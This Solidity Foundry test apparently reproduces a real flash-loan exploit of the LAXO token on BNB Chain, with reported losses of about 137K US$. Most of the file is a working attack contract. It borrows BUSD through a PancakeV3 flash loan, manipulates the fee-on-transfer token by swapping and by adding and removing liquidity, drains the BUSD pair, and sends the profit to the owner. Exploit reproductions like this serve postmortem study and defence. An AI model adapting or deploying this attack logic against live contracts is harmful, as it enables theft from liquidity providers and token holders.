// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.23;

import "../basetest.sol";
import "../interface.sol";


// @KeyInfo - Total Lost : ~137K US$
// Attacker : 0x17f9132E66A78b93195b4B186702Ad18Fdcd6E3D
// Attack Contract : 0x6588ACB7dd37887C707C08AC710A82c9F9A7C1E9
// Vulnerable Contract : 0x62951CaD7659393BF07fbe790cF898A3B6d317CB
// Attack Tx : 0xd58f3ef6414b59f95f55dae1acb3d5d6e626acf5333917c6d43fe422d98ac7d3

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x62951CaD7659393BF07fbe790cF898A3B6d317CB#code

// @Analysis
// Twitter Guy : https://x.com/CertiKAlert/status/2027317095420072317

contract LAXO_Token_exp is BaseTestWithBalanceLog {
    bytes32 exploitTx=0xd58f3ef6414b59f95f55dae1acb3d5d6e626acf5333917c6d43fe422d98ac7d3;
    address busd = 0x55d398326f99059fF775485246999027B3197955;
    address laxo = 0x62951CaD7659393BF07fbe790cF898A3B6d317CB;
    AttackContract attack;

    function setUp() public {
        vm.createSelectFork("bsc", exploitTx); // blocknumber = 82_730_141
        attack = new AttackContract();
        deal(laxo, address(attack), 1_000_000_000_000_000_000, false);
        vm.deal(address(attack),100_000_000_000_000);
    }

    function testExploit() public {
        uint beforeAmount = IERC20(busd).balanceOf(address(this));
        attack.start();
        uint afterAmount = IERC20(busd).balanceOf(address(this));
        emit log_named_decimal_uint("BSC-USD: ", afterAmount-beforeAmount, 18);

    }
}

contract AttackContract{
    address owner;
    IERC20 busd = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 laxo = IERC20(0x62951CaD7659393BF07fbe790cF898A3B6d317CB);
    Uni_Pair_V3 pancake = Uni_Pair_V3(0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb);
    IPancakePair wbnb_pair = IPancakePair(0x78A4bb0b1D32fedbd8baC49055649030DCDe7985);
    IPancakePair busd_pair = IPancakePair(0xF05a6361e6F851BbFf39C4f1d9aD4b661d3180B3);
    IUniswapV2Router router = IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    
    uint constant deadline = 1_771_774_364;

    constructor(){
        owner=msg.sender;
    }
    
    function start() public{
        pancake.flash(address(this), 350_000_000_000_000_000_000_000, 0, abi.encode(2_739_720_310));
    }
    
    function pancakeV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
        busd.approve(address(router),type(uint).max);

        address[] memory path = new address[](2);
        path[0]=address(busd);
        path[1]=address(laxo);
        
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            350_000_000_000_000_000_000_000,
            0,
            path,
            address(router),
            deadline
        );

        laxo.approve(address(router),type(uint).max);
        router.addLiquidityETH{value:address(this).balance}(address(laxo), 10_000, 0, 0, address(this), deadline);
        wbnb_pair.approve(address(router), type(uint).max);
        router.removeLiquidityETHSupportingFeeOnTransferTokens(address(laxo), 100_000, 0, 0, address(this), deadline);
        
        require(52_057_043_674_336_149_349_295_101==laxo.balanceOf(address(busd_pair)), "busd_pair check");
        laxo.transfer(address(busd_pair),laxo.balanceOf(address(busd_pair)));
        
        (uint reserve0, uint reserve1, )=busd_pair.getReserves();
        uint256 amountOut = router.getAmountOut(41_072_653_255_359_825_749_210_636, reserve1, reserve0);

        require(amountOut == 487_495_176_743_718_966_418_330, "amountOut check");
        busd_pair.swap(amountOut, 0, address(this), new bytes(0));
        busd.transfer(address(pancake), 350_175_000_000_000_000_000_000);

        require(137_320_176_743_718_966_418_330 == busd.balanceOf(address(this)),"busd check");
        busd.transfer(owner,busd.balanceOf(address(this)));
    }
    receive() external payable{}
}
